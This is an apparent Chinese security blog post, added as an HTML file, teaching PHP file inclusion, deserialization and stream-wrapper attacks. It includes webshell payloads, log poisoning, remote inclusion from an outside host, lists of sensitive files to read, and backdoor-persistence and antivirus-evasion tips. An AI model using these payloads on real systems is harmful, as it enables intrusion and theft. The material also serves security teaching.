@@ -1,0 +1,454 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PHP一些常见的漏洞梳理 | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PHP一些常见的漏洞梳理 | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="摘抄https://mp.weixin.qq.com/s/17DWHj3PF-mrYzMFAwZtTw
+PHP一些常见的漏洞梳理
+php反序列参考链接：
+https://www.cnblogs.com/xiaoqiyue/p/1095183..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PHP一些常见的漏洞梳理
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                14 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>摘抄https://mp.weixin.qq.com/s/17DWHj3PF-mrYzMFAwZtTw</p>
+<p>PHP一些常见的漏洞梳理</p>
+<h1 id="php反序列参考链接">php反序列参考链接：</h1>
+<p>https://www.cnblogs.com/xiaoqiyue/p/10951836.html</p>
+<h1 id="php伪协议参考链接">php伪协议参考链接：</h1>
+<p>https://www.cnblogs.com/endust/p/11804767.html</p>
+<p>一、php文件包含漏洞</p>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<p>1.常见包含函数<br>
+include()：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。<br>
+require()：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行<br>
+include_once&amp;require_once()：这两个函数行为与include/require类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+<p>2.利用条件<br>
+程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件<br>
+用户能够控制该动态变量<br>
+配置文件php.ini中参数allow_url_fopen=open，此参数默认为open<br>
+远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+<p>3.包含分类<br>
+本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。<br>
+远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+<p>4.利用方法<br>
+包含日志文件getshell<br>
+包含data:或php://input等伪协议<br>
+若有phpinfo则可以包含临时文件<br>
+如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+<p>5.实例<br>
+假如目标网站有news.php文件，文件内容为：</p>
+<?php
+$test=$_GET['id'];   
+include($test);
+?>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<?php phpinfo()?>
+<p>此时访问测试：http://192.168.1.3/fileinclude/news.php?id=test.txt。将test.txt文件传送给id参数并复制给test变量，然后txt文件被当作php脚本脚本文件执行。<br>
+同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<h1 id="常见敏感文件l">常见敏感文件l</h1>
+<h2 id="http19216813fileincludenewsphpidc1txtwwwtestcomtestphptestetcpasswodwwwtestcomtestphptestetcshadowwwwtestcomtestphptestetcphp5apache2phpiniwwwtestcomtestphptestetcmysqlmycnfwwwtestcomtestphptestetcapache2apache2conf">http://192.168.1.3/fileinclude/news.php?id=c:\1.txt<br>
+www.test.com/test.php?test=../../../../../etc/passwod<br>
+www.test.com/test.php?test=/etc/shadow<br>
+www.test.com/test.php?test=/etc/php5/apache2/php.ini<br>
+www.test.com/test.php?test=/etc/mysql/my.cnf<br>
+www.test.com/test.php?test=/etc/apache2/apache2.conf</h2>
+<p>windows敏感文件：<br>
+c:\boot.ini</p>
+<h1 id="查看系统版本">查看系统版本</h1>
+<p>c:\windows\system32\inetsrv\metabase.xml</p>
+<h1 id="查看iis配置文件">查看iis配置文件</h1>
+<p>c:\windows\repair\sam</p>
+<h1 id="存储系统初次安装的密码">存储系统初次安装的密码</h1>
+<p>c:\program files\mysql\my.ini</p>
+<h1 id="mysql配置文件">mysql配置文件</h1>
+<p>c:\program files\mysql\data\mysql\user.myd</p>
+<h1 id="mysql-root密码">mysql root密码</h1>
+<p>c:\windows\php.ini</p>
+<h1 id="php配置信息">php配置信息</h1>
+<p>c:\windows\my.ini</p>
+<h1 id="mysql配置信息">mysql配置信息</h1>
+<hr>
+<p>/root/.ssh/authorized_keys<br>
+/root/.ssh/id_rsa<br>
+/root/.ssh/id_ras.keystore<br>
+/root/.ssh/known_hosts<br>
+/etc/passwd<br>
+/etc/shadow<br>
+/etc/my.cnf<br>
+/etc/httpd/conf/httpd.conf<br>
+/root/.bash_history<br>
+/root/.mysql_history<br>
+/proc/self/fd/fd[0-9]*(文件标识符)<br>
+/proc/mounts<br>
+/porc/config.gz</p>
+<p>6.附加后缀截断<br>
+例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<?php
+$test=$_GET['id'];   
+include($test).'.php';
+?>
+<p>绕过方法一：%00截断<br>
+http://www.test.com/test/a.php?c=1.txt%00</p>
+<p>注意：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</p>
+<p>绕过方法二：文件名附加./././././.进行长度截断<br>
+http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././....</p>
+<p>注意：Windows服务器字节长度应大于256，Linux要大于4096</p>
+<p>7.包含日志拿shell<br>
+#文件包含漏洞读取apache配置文件<br>
+index.php?page=/etc/init.d/httpd<br>
+index.php?page=/etc/httpd/conf/httpd.conf<br>
+#Linux默认访问url的日志<br>
+/var/log/httpd/access_log<br>
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问<br>
+拿shell步骤<br>
+访问../file.php?id=1<?php @eval($_POST[a]);?><br>
+后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录<br>
+然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+<p>实例：ekucms某版本存在文件包含漏洞<br>
+①通过访问该url，将一句话木马写入日志文件中<br>
+http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}</p>
+<p>②该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell<br>
+http://192.168.1.3/ekucms2.4.1/?s=my/show/id/..\temp\logs\20_05_18.log</p>
+<p>8.读源代码<br>
+直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。<br>
+http://192.168.1.3/news.php?id=shell.php</p>
+<p>此时可以使用封装伪协议读取：<br>
+http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php<br>
+//核心代码：id=php://filter/read=convert.base64-encode/resource=<br>
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。</p>
+<p>9.远程文件包含<br>
+远程文件包含文件名不能为php可解析的扩展名。另外远程文件包含要确保php.ini中allow_url_fopen和allow_url_include状态为on。为躲避杀软将大马放到自己的vps上然后远程包含。</p>
+<p>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png</p>
+<p>远程包含限制绕过后缀名限制：<br>
+#源代码</p>
+<?php 
+include($_GET['filename'] . ".html"); 
+?>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：</p>
+<p>绕过方法：<br>
+filename=http://www.xxx.com/FI/php.txt?<br>
+filename=http://www.xxx.com/FI/php.txt%23<br>
+filename=http://www.xxxi8.com/FI/php.txt%20<br>
+filename=http://www.xxx.com/FI/php.txt%00</p>
+<p>利用远程文件包含进行权限维持<br>
+include代码不会报毒。所以我们在getshell后在网站配置文件中写入包含代码(如：config.php,<?php include($_GET['x']);?>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标allow_url_fopen和allow_url_include状态都为on。既可以永久进行远程包含，达到权限维持的目的。</p>
+<p>二、漏洞梳理篇之php反序列化漏洞</p>
+<p>1.序列化函数serialize()<br>
+序列化的目的是方便数据的传输和存储。当在php中创建了一个对象后，可以通过serialize()函数把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下；</p>
+<?php
+class chybeta{
+    var $test = '123';
+}
+$class1 = new chybeta;
+$class1_ser = serialize($class1);
+print_r($class1_ser);
+?>
+<p>#创建一个对象，然后序列化并输出<br>
+代码执行输出结果：O:7:“chybeta”:1:{s:4:“test”;s:3:“123”;}</p>
+<p>返回结果中各字符的含义分别为：<br>
+O  代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。<br>
+7  表示对象的名称有7个字符。&quot;chybeta&quot;表示对象的名称。<br>
+1  表示有一个值<br>
+{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}中，<br>
+s  表示字符串<br>
+4  表示该字符串的长度，<br>
+&quot;test&quot;  为字符串的名称<br>
+&quot;123&quot;   为字符串的内容</p>
+<p>2.反序列化函数unserialize()<br>
+与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象。测试代码：</p>
+<?php
+class chybeta{
+    var $test = '123';
+}
+$class2 = 'O:7:"chybeta":1:{s:4:"test";s:3:"123";}';    
+print_r($class2);
+echo "</br>";
+$class2_unser = unserialize($class2);
+print_r($class2_unser);
+?>
+<p>#给定一串序列化后的字符将其反序列化并打印<br>
+执行结果：</p>
+<p>当传给unserialize()函数的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p>
+<p>3.php反序列化漏洞<br>
+由于未对用户输入的序列化字符串进行检测，导致攻击者控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。<br>
+漏洞触发条件：<br>
+unserialize函数的变量可控<br>
+php文件中存在可利用的类<br>
+类中有魔术方法。<br>
+php中有一类特殊的方法叫“Magic function”，在反序列化的过程中会自动触发这些魔术方法。<br>
+__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的<br>
+__destruct()：当对象被销毁时会自动调用<br>
+__wakeup() ：unserialize()时会自动调用</p>
+<p>unserialize()导致__wakeup()或__destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码存在于__wakeup()或__destruct()等构造函数中，当我们控制序列化字符串时可以去直接触发它们。</p>
+<p>针对 __wakeup() 场景实验，序列化漏洞代码如下：</p>
+<?php
+class chybeta{
+    var $test = '123';
+    function __wakeup(){
+        $fp = fopen("shell.php","w") ;
+        fwrite($fp,$this->test);
+        fclose($fp);
+    }
+}
+$class3 = $_GET['test'];
+print_r($class3);
+echo "</br>";
+$class3_unser = unserialize($class3);
+?>
+<p>反序列化漏洞思路<br>
+1.本地搭建好环境后，通过 serialize() 得到我们要的序列化字符串，例如这里序列化phpinfo得到序列化内容为：O:7:“chybeta”:1:{s:4:“test”;s:19:&quot;<?php phpinfo(); ?>&quot;;}</p>
+<p>2.执行含有php反序列化漏洞的代码，即访问http://localhost/index.php?test=O:7:%22chybeta%22:1:{s:4:%22test%22;s:19:%22%3C?php%20phpinfo();?%3E%22;}</p>
+<p>3.通过源代码知，把对象中的test值赋为 “<?php phpinfo(); ?>”,调用unserialize()函数，通过__wakeup()执行代码将传入的参数进行反序列化处理如下图，成功显示了phpinfo页面：在反序列化该数据时，自动触发了构造函数,执行 phpinfo():</p>
+<p>三、漏洞梳理篇之php伪协议</p>
+<p>1.环境概要：<br>
+PHP伪协议指的是PHP所支持的协议与封装协议，在web渗透漏洞利用中常用于配合文件包含进行web攻击，从而获取网站权限。</p>
+<p>①php.ini配置文件参数：<br>
+allow_url_fopen ：on	#默认开启 ，表示允许url里的封装协议访问文件；<br>
+allow_url_include：off  #默认关闭，表示不允许包含url里的封装协议包含文件；</p>
+<p>②常用伪协议条件及方法</p>
+<p>③注意点<br>
+各个伪协议适用php版本不尽相同，以下实验环境php版本在5.2~5.7之间疯狂来回切换，到最后已经无法总结各协议实验成功所使用的php版本。总之：php&gt;5.2.0<br>
+以下所有实例均使用Firefox浏览器</p>
+<p>2.伪协议实例<br>
+①php://input<br>
+php://input 是可以访问请求原始数据的只读流。在POST 请求的情况下，由于php://input不依赖于特定的php.ini指令，可以使用它代替 $HTTP_RAW_POST_DATA</p>
+<p>注意点<br>
+input必须以post请求<br>
+enctype=“multipart/form-data” 的时候 php://input 是无效的<br>
+allow_url_include=on</p>
+<p>实例一：php://input将文件包含漏洞变成代码执行漏洞<br>
+1）目标网站存在包含漏洞</p>
+<?php @include($_GET["file"])?>
+<p>2）使用php://input，将执行代码通过在POST data中提交。形成命令执行</p>
+<?php system('ipconfig');?>
+<p>实例二：php://input利用文件包含写入shell<br>
+1）目标网站存在包含漏洞</p>
+<?php @include($_GET["file"])?>
+<p>2）使用php://input，将执行代码通过在POST data中提交<br>
+#post方式提交</p>
+<?php 
+echo file_put_contents("test.php",base64_decode("PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4="));
+?>
+<p>执行成功会在当前目录下生成一句话shell，可直接连接</p>
+<p>实例三：php://input协议直接写入shell<br>
+1）含有php://input的代码漏洞文件：</p>
+<?php 
+$data = file_get_contents('php://input'); 
+eval($data); 
+?>
+<p>POST直接传参执行php代码：</p>
+<p>同理，这里在post数据提交生成shell的代码，会在同级目录下生成shell：<br>
+echo file_put_contents(&quot;ceshi.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));</p>
+<p>②data:URL代码执行<br>
+将攻击代码转换为data:URL形式进行攻击，以传递相应格式的数据用来执行PHP代码。为了防止直接在URL连接中的一些敏感字符被waf检测拦截，可将攻击代码进行base64编码。<br>
+#文件包含代码：</p>
+<?php include $_GET['file']?>   
+<p>访问执行：<br>
+127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==</p>
+<p>条件：allow_url_include = on&amp;allow_url_fopen()=on&amp; PHP &gt;= 5.2.0</p>
+<p>③php://filter读取源代码<br>
+php://filter用于读取网站源码。读取php文件源码内容(直接包含脚本格式文件会解析无法直接获取文件源码)。用法：<br>
+?file=php://filter/read=convert.base64-encode/resource=1.php</p>
+<p>④file://物理路径包含文件<br>
+file://协议在allow_url_fopen,allow_url_include都为off的情况下也可以正常使用：<br>
+?file=file:///C:\phpStudy\WWW\fileinclude\2\1.txt</p>
+<p>⑤data://:利用文件包含&amp;data://进行命令执行<br>
+?file=data://text/plain,%3C?php%20system(%27whoami%27);?%3E</p>
+<p>⑥zip://绕过文件包含下的附加后缀<br>
+以下两串代码是对文件后缀进行验证或修改然后再进行包含。对于此类情况，如果要包含非预定文件后缀的文件，可以通过%00截断进行绕过。但是%00截断在php版本5.3.4之后就失效了，而且还要考虑GPC，限制比较严重。除此之外，可以通过zip协议和phar协议来包含文件，突破附加后缀限制。</p>
+<h1 id="验证包含对象文件后缀是否为jpg如果是才进行包含">验证包含对象文件后缀是否为jpg，如果是才进行包含</h1>
+<?php
+$file = $_GET['file'];
+if(isset($file) && strtolower(substr($file, -4)) == ".jpg"){
+    include($file);
+}
+?>
+<p>#直接为包含对象添加jpg后缀，然后进行包含</p>
+<?php
+$file = $_GET['file'];
+include($file.'.jpg');
+?>
+<p>绕过方法：<br>
+1）实战情况下向目标站点上传zip文件，里面压缩着一个jpg格式的php脚本</p>
+<p>2）构造zip://php.zip#php.jpg，进行zip://伪协议绕过后缀名限制。这里将压缩文件里面的内容修改为在当前目录下生成一句话即可getshell。<br>
+?file=zip://php.zip%23php.jpg</p>
+<p>阅读 2001<br>
+赞10<br>
+在看10</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">php反序列参考链接：</a></li>
+<li><a href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">php伪协议参考链接：</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6l">常见敏感文件l</a>
+<ul>
+<li><a href="#http19216813fileincludenewsphpidc1txtwwwtestcomtestphptestetcpasswodwwwtestcomtestphptestetcshadowwwwtestcomtestphptestetcphp5apache2phpiniwwwtestcomtestphptestetcmysqlmycnfwwwtestcomtestphptestetcapache2apache2conf">http://192.168.1.3/fileinclude/news.php?id=c:\1.txt<br>
+www.test.com/test.php?test=../../../../../etc/passwod<br>
+www.test.com/test.php?test=/etc/shadow<br>
+www.test.com/test.php?test=/etc/php5/apache2/php.ini<br>
+www.test.com/test.php?test=/etc/mysql/my.cnf<br>
+www.test.com/test.php?test=/etc/apache2/apache2.conf</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC">查看系统版本</a></li>
+<li><a href="#%E6%9F%A5%E7%9C%8Biis%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">查看iis配置文件</a></li>
+<li><a href="#%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F%E5%88%9D%E6%AC%A1%E5%AE%89%E8%A3%85%E7%9A%84%E5%AF%86%E7%A0%81">存储系统初次安装的密码</a></li>
+<li><a href="#mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">mysql配置文件</a></li>
+<li><a href="#mysql-root%E5%AF%86%E7%A0%81">mysql root密码</a></li>
+<li><a href="#php%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF">php配置信息</a></li>
+<li><a href="#mysql%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF">mysql配置信息</a></li>
+<li><a href="#%E9%AA%8C%E8%AF%81%E5%8C%85%E5%90%AB%E5%AF%B9%E8%B1%A1%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%98%AF%E5%90%A6%E4%B8%BAjpg%E5%A6%82%E6%9E%9C%E6%98%AF%E6%89%8D%E8%BF%9B%E8%A1%8C%E5%8C%85%E5%90%AB">验证包含对象文件后缀是否为jpg，如果是才进行包含</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/csrf-de-yuan-li-yu-wei-hai/">
+              <h3 class="post-title">
+                csrf的原理与危害
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
